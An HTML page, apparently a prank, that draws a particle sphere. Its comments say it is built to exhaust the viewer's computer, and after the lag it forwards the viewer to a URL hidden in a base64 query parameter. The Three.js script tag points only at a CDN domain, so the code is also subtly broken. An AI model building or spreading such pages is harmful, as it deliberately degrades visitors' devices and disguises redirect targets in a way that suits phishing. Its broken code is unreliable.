<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VSBM Sphere</title>
    <style>
        body { margin: 0; background: #000; overflow: hidden; }
        canvas { display: block; }
    </style>
    <script src="https://cdnjs.cloudflare.com"></script>
</head>
<body>
    <script>
        let scene, camera, renderer, points;
        const particleCount = 100000; // 十萬個粒子，極限吃資源

        window.onload = function() {
            const params = new URLSearchParams(window.location.search);
            const data = params.get('data');
            
            // 初始化 3D 球體
            initSphere();

            // 如果有加密內容，1.5 秒後彈出訊息
            if (data) {
                try {
                    const decoded = decodeURIComponent(escape(atob(data)));
                    if (decoded.startsWith('http')) {
                        // 網址跳轉延遲 3 秒，讓對方先卡一下
                        setTimeout(() => { window.location.href = decoded; }, 3000);
                    } else {
                        setTimeout(() => { alert(decoded); }, 1500);
                    }
                } catch (e) {}
            }
        };

        function initSphere() {
            scene = new THREE.Scene();
            camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 1, 2000);
            camera.position.z = 600;

            renderer = new THREE.WebGLRenderer({ antialias: false, powerPreference: "high-performance" });
            renderer.setSize(window.innerWidth, window.innerHeight);
            renderer.setPixelRatio(window.devicePixelRatio); 
            document.body.appendChild(renderer.domElement);

            const geometry = new THREE.BufferGeometry();
            const positions = new Float32Array(particleCount * 3);
            const colors = new Float32Array(particleCount * 3);

            // 建立球狀分佈的粒子
            for (let i = 0; i < particleCount; i++) {
                const phi = Math.acos(-1 + (2 * i) / particleCount);
                const theta = Math.sqrt(particleCount * Math.PI) * phi;

                positions[i * 3] = 300 * Math.cos(theta) * Math.sin(phi);
                positions[i * 3 + 1] = 300 * Math.sin(theta) * Math.sin(phi);
                positions[i * 3 + 2] = 300 * Math.cos(phi);

                colors[i * 3] = Math.random();
                colors[i * 3 + 1] = Math.random();
                colors[i * 3 + 2] = Math.random();
            }

            geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
            geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));

            const material = new THREE.PointsMaterial({
                size: 2,
                vertexColors: true,
                transparent: true,
                opacity: 0.9
            });

            points = new THREE.Points(geometry, material);
            scene.add(points);

            animate();
        }

        function animate() {
            requestAnimationFrame(animate);
            
            // 球體旋轉
            points.rotation.x += 0.005;
            points.rotation.y += 0.01;

            // 粒子抖動（核心吃效能處）
            const pos = points.geometry.attributes.position.array;
            for (let i = 0; i < pos.length; i++) {
                pos[i] += (Math.random() - 0.5) * 2;
            }
            points.geometry.attributes.position.needsUpdate = true;

            renderer.render(scene, camera);
        }

        // 視窗大小調整自動適應
        window.addEventListener('resize', () => {
            camera.aspect = window.innerWidth / window.innerHeight;
            camera.updateProjectionMatrix();
            renderer.setSize(window.innerWidth, window.innerHeight);
        });
    </script>
</body>
</html>
